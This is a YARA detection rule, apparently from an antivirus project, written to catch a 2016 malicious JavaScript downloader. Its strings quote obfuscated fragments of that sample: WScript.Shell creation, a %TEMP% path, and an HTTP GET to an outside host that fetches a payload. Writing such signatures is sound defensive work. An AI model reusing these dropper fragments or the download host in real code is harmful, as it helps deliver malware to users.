rule sig_20160427_66b851b86f2cff82bd00ec5b749d23e9 {
  meta:
    description = "datamaliciousorder - file 20160427_66b851b86f2cff82bd00ec5b749d23e9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ab696a6a053c2376eac6926bc616d34d50f17efdf32e9e8e6ba416a857076eb9"

  strings:
    $s1  = "function UidkmTawcx() {return TmmgtOwuwb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"6CH3wdT" ascii
    $s2  = "function UidkmTawcx() {return TmmgtOwuwb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"6CH3wdT" ascii
    $s3  = "var TmmgtOwuwb = function QqomoKrmin() {return GvrbaSwffa[MiotrHitlz](\"WScript\"+\".Shell\");}(), WvdagStetf = 11;" fullword ascii
    $s4  = "function ZdeavZahct(EsnpdQdtue, IsjhbLedwo){PeozkYrcwq = PeozkYrcwq * 1; return EsnpdQdtue - IsjhbLedwo;};" fullword ascii
    $s5  = "BkoscOhtny[PomixElsar](\"G\" + \"ET\", \"http://warcraft-lich-king.ru/i4ospd\", false);" fullword ascii
    $s6  = "var GvrbaSwffa = this[\"WScript\"];" fullword ascii
    $s7  = "if (BkoscOhtny[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function XvplgYtjyc(){return BrkvuGlfnj + \"\";};" fullword ascii
    $s9  = "function BjubaObpdm() {return ((XnlujNlunt == true) && (XnlujNlunt == CgmkmAobdx)) ? 1 : PeozkYrcwq;};" fullword ascii
    $s10 = "XnlujNlunt = true; " fullword ascii
    $s11 = "var XnlujNlunt = false;" fullword ascii
    $s12 = "CgmkmAobdx = true; " fullword ascii
    $s13 = "var LefluDtnot = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "return ZdeavZahct(CfonwIxvzy, VzqxxMaxqb);" fullword ascii
    $s15 = "var CgmkmAobdx = false;" fullword ascii
    $s16 = "function YfuiqMypsj(){return 23;};" fullword ascii
    $s17 = "function UrrwlSpcvx()" fullword ascii
    $s18 = "function GphhkMhbrw(PlexhTrjoq) {var KqftuAfvou = (1, 2, 3, 4, 5, PlexhTrjoq); return KqftuAfvou;};" fullword ascii
    $s19 = "var NuffcLhuec = false;" fullword ascii
    $s20 = "function EkvwpBytdf(){return MiotrHitlz;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}